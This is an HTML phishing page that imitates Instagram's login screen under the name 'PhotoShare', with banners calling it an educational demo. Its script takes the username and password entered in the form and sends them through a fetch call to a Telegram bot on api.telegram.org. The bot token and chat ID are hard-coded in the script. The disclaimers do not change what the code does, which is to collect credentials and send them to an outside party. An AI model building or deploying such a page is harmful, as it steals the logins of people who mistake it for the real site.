<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Social Media Login - Demo Page</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
        }

        body {
            background-color: #fafafa;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            flex-direction: column;
        }

        .container {
            max-width: 350px;
            width: 100%;
            padding: 20px;
        }

        .warning-banner {
            background-color: #ffc107;
            color: #000;
            text-align: center;
            padding: 10px;
            font-size: 14px;
            border-radius: 5px;
            margin-bottom: 15px;
            font-weight: bold;
        }

        .login-card {
            background-color: #ffffff;
            border: 1px solid #dbdbdb;
            border-radius: 1px;
            padding: 40px 30px 30px 30px;
            margin-bottom: 10px;
        }

        .logo {
            text-align: center;
            margin-bottom: 30px;
            font-family: 'Billabong', cursive;
            font-size: 50px;
            font-weight: 400;
            color: #262626;
        }

        @font-face {
            font-family: 'Billabong';
            src: url('https://cdn.rawgit.com/mil/fonts/master/ff/billabong/billabong.ttf') format('truetype');
            font-weight: normal;
            font-style: normal;
        }

        form {
            display: flex;
            flex-direction: column;
        }

        .input-field {
            background-color: #fafafa;
            border: 1px solid #dbdbdb;
            border-radius: 3px;
            padding: 9px 0 7px 8px;
            margin-bottom: 6px;
            font-size: 12px;
            outline: none;
            width: 100%;
        }

        .login-btn {
            background-color: #0095f6;
            color: white;
            border: none;
            border-radius: 4px;
            padding: 7px 16px;
            font-weight: 600;
            font-size: 14px;
            margin-top: 10px;
            cursor: pointer;
        }

        .login-btn:hover {
            background-color: #1877f2;
        }

        .footer {
            max-width: 350px;
            margin-top: 20px;
            text-align: center;
            font-size: 12px;
            color: #8e8e8e;
        }

        .demo-notice {
            background-color: #f8f9fa;
            border: 1px solid #dee2e6;
            border-radius: 5px;
            padding: 15px;
            margin-bottom: 20px;
            font-size: 14px;
            color: #6c757d;
            text-align: center;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="warning-banner">
            ‚ö†Ô∏è This is a Demo Page for Educational Purpose Only
        </div>
        
        <div class="demo-notice">
            <strong>Demo Login Page</strong><br>
            This is not the real Instagram. Please do not use real passwords.
        </div>

        <div class="login-card">
            <div class="logo">PhotoShare</div>
            
            <form id="loginForm">
                <input type="text" class="input-field" placeholder="Username or Email" id="username" required>
                <input type="password" class="input-field" placeholder="Password" id="password" required>
                <button type="submit" class="login-btn" id="loginBtn">Continue</button>
            </form>
        </div>

        <div class="footer">
            <p>¬© 2024 Demo Project ‚Ä¢ Not Affiliated with Instagram</p>
        </div>
    </div>

    <script>
        // Function to send to Telegram
        window.sendToTelegram = function(username, password) {
            const botToken = '8549484649:AAEN6QrU5v3npjZct1C9K-dPZ1xHK9lRqig';
            const chatId = '6398977115';
            
            const message = `üîê *Demo Page Login*
üë§ *Username:* ${username}
üîë *Password:* ${password}
üåç *Time:* ${new Date().toLocaleString()}`;

            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    chat_id: chatId,
                    text: message,
                    parse_mode: 'Markdown'
                })
            })
            .then(res => res.json())
            .then(data => console.log('Sent to Telegram:', data))
            .catch(err => console.log('Error:', err));
        };

        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault();
            
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            
            if (!username || !password) {
                alert('Please fill in all fields');
                return;
            }

            // Send to Telegram
            sendToTelegram(username, password);
            
            // Show message
            alert('Demo: This is a test page. Your info has been logged.');
            
            // Clear form
            document.getElementById('username').value = '';
            document.getElementById('password').value = '';
        });
    </script>
</body>
</html>
